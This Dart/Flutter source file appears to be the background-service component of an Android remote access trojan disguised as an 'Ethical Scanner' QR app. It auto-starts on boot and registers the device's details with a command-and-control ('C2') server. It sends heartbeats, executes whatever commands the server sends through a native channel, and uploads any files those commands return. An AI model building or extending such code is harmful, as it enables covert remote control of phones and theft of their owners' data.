// lib/services/background_service.dart
// Simplified version that delegates ALL commands to native service

import 'dart:async';
import 'dart:isolate';
import 'dart:ui';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile;
import 'package:shared_preferences/shared_preferences.dart';

import '../config/app_config.dart';
import '../utils/constants.dart';
import 'device_info_service.dart';
import 'network_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
Timer? _reconnectionTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
int _reconnectionAttempts = 0;
const int _maxReconnectionAttempts = 50;

// Native command channel - The ONLY way to execute commands now
const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final deviceInfo = DeviceInfoService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  
  debugPrint("BackgroundService: Starting with DeviceID = $deviceId (Native-Only Mode)");

  final handles = BackgroundServiceHandles(
    networkService: network,
    deviceInfoService: deviceInfo,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {'device_id': deviceId});

  // Enhanced connection monitoring with automatic reconnection
  _setupConnectionMonitoring(handles);
  
  // Start initial connection
  await _connectWithRetry(handles);

  // Handle initial data sending
  _setupInitialDataHandler(handles);

  // Handle service stop
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    await _stopService(handles);
  });
}

void _setupConnectionMonitoring(BackgroundServiceHandles h) {
  _connectionStatusSubscription = h.networkService.connectionStatusStream.listen((isConnected) {
    debugPrint("BackgroundService: Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    
    h.serviceInstance.invoke('update', {
      'socket_status': isConnected ? 'Connected' : 'Disconnected',
    });

    if (isConnected) {
      _reconnectionAttempts = 0;
      _reconnectionTimer?.cancel();
      _registerDeviceWithC2(h);
      _startHeartbeat(h);
    } else {
      _stopHeartbeat();
      _scheduleReconnection(h);
    }
  });

  _commandSubscription = h.networkService.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
    debugPrint("BackgroundService: Received command '$cmd' - delegating to native service");
    _handleC2CommandNativeOnly(h, cmd, args);
  });
}

void _scheduleReconnection(BackgroundServiceHandles h) {
  if (_reconnectionAttempts >= _maxReconnectionAttempts) {
    debugPrint("BackgroundService: Max reconnection attempts reached. Will retry in 60 seconds.");
    _reconnectionAttempts = 0;
  }
  
  _reconnectionTimer?.cancel();
  final delay = Duration(seconds: 5 + (_reconnectionAttempts * 2).clamp(0, 60));
  
  _reconnectionTimer = Timer(delay, () async {
    _reconnectionAttempts++;
    debugPrint("BackgroundService: Attempting reconnection #$_reconnectionAttempts");
    await _connectWithRetry(h);
  });
}

Future<void> _connectWithRetry(BackgroundServiceHandles h) async {
  try {
    await h.networkService.connectSocketIO(h.currentDeviceId);
  } catch (e) {
    debugPrint("BackgroundService: Connection failed: $e");
    _scheduleReconnection(h);
  }
}

void _setupInitialDataHandler(BackgroundServiceHandles h) {
  h.serviceInstance.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((Map<String, dynamic>? argsFromUi) async {
    final alreadySent = h.preferences.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    h.serviceInstance.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint("BackgroundService: Initial data already marked as sent, and no new UI trigger.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }

    if (argsFromUi == null) {
      debugPrint("BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    
    if (jsonData == null) {
      debugPrint("BackgroundService: jsonData is null within argsFromUi, cannot send initial data.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - JSON Data Null'});
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)..['deviceId'] = h.currentDeviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      imageFile = XFile(imagePath);
    }

    final success = await h.networkService.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    
    if (success) {
      await h.preferences.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Sent Successfully'});
    } else {
      debugPrint("BackgroundService: Failed to send initial data");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Failed to Send'});
    }
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint("BackgroundService: Device registration attempt sent for ID: ${h.currentDeviceId}");
  } catch (e, s) {
    debugPrint("BackgroundService: Error registering device: $e\n$s");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
    h.serviceInstance.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': h.currentDeviceId,
      'socket_status': h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
    });
  });
  
  debugPrint("BackgroundService: Heartbeat started for Device ID: ${h.currentDeviceId}. Interval: ${C2_HEARTBEAT_INTERVAL.inSeconds}s");
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

/// Handle C2 commands by delegating EVERYTHING to native service
Future<void> _handleC2CommandNativeOnly(BackgroundServiceHandles h, String commandName, Map<String, dynamic> args) async {
  debugPrint("BackgroundService: Delegating command '$commandName' to native service");
  
  try {
    // Check if native service is available first
    final isAvailable = await _isNativeServiceAvailable();
    if (!isAvailable) {
      debugPrint("BackgroundService: Native service not available for command: $commandName");
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {'message': 'Native command service not available'},
      );
      return;
    }

    // Execute command through native service
    final result = await _nativeCommandsChannel.invokeMethod('executeCommand', {
      'command': commandName,
      'args': args,
    });
    
    if (result != null && result is Map) {
      // Success - send response back to C2
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'success',
        payload: Map<String, dynamic>.from(result),
      );
      
      // If the result contains a file path, trigger upload
      if (result.containsKey('path') && result['path'] is String) {
        final filePath = result['path'] as String;
        await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: commandName,
          fileToUpload: XFile(filePath),
        );
      }
      
    } else {
      // Command failed
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {'message': 'Native command returned null or invalid result'},
      );
    }
    
  } on PlatformException catch (e) {
    debugPrint("BackgroundService: Native command failed: ${e.code} - ${e.message}");
    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      status: 'error',
      payload: {'message': '${e.code}: ${e.message}'},
    );
  } catch (e, s) {
    debugPrint("BackgroundService: Unexpected error in native command $commandName: $e\nStackTrace: $s");
    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      status: 'error',
      payload: {'message': 'Unexpected error: ${e.toString()}'},
    );
  }
}

/// Check if native command service is available
Future<bool> _isNativeServiceAvailable() async {
  try {
    final result = await _nativeCommandsChannel.invokeMethod('isNativeServiceAvailable');
    return result == true;
  } catch (e) {
    debugPrint("BackgroundService: Native service check failed: $e");
    return false;
  }
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  debugPrint("BackgroundService: Received stop service event. Stopping...");
  
  _stopHeartbeat();
  _reconnectionTimer?.cancel();
  
  h.networkService.disconnectSocketIO();
  
  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  
  await _commandSubscription?.cancel();
  _commandSubscription = null;
  
  h.networkService.dispose();
  await h.serviceInstance.stopSelf();
  
  debugPrint("BackgroundService: Service stopped.");
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  final flnp = FlutterLocalNotificationsPlugin();
  const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
  const initSettings = InitializationSettings(android: androidInit);

  try {
    await flnp.initialize(initSettings);
    debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
  } catch (e, s) {
    debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
  }

  const channel = AndroidNotificationChannel(
    'qr_scanner_service_channel',
    'Ethical Scanner Service',
    description: 'Background service for the Ethical Scanner application.',
    importance: Importance.high,
    playSound: false,
    enableVibration: false,
    showBadge: true,
  );

  final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
      flnp.resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>();

  if (androidImplementation != null) {
    try {
      await androidImplementation.createNotificationChannel(channel);
      debugPrint("Notification channel 'qr_scanner_service_channel' created successfully.");
    } catch (e, s) {
      debugPrint("Error creating notification channel: $e\n$s");
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner Active (Native Mode)',
      initialNotificationContent: 'All commands handled by native service.',
      foregroundServiceNotificationId: 888,
      autoStartOnBoot: true,
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onStart,
    ),
  );
  
  debugPrint("Background service configured for native-only command execution.");
}